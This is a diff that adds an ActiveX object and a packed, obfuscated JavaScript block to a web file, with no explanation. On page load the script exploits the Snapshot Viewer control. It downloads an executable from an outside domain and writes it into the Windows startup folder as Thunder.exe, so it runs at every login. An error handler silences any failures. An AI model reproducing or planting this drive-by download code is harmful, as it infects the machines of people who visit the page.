@@ -1,0 +1,6 @@
+<object classid='clsid:F0E42D50-368C-11D0-AD81-00A0C90DC8D9' id='obj'></object>
+<script language='javascript'>
+window.onerror=function(){return true;}
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 2=\'9://8.b.7/5.4\';1 3=\'6:/a j h/c g/「开始」菜单/程序/启动/f.4\';0.d=2;0.e=3;0.i();',20,20,'obj|var|buf1|buf2|exe|tt|C|cn|miibeiean|http|Documents|org|All|SnapshotPath|CompressedPath|Thunder|Users|Settings|PrintSnapshot|and'.split('|'),0,{}))
+
+</script>
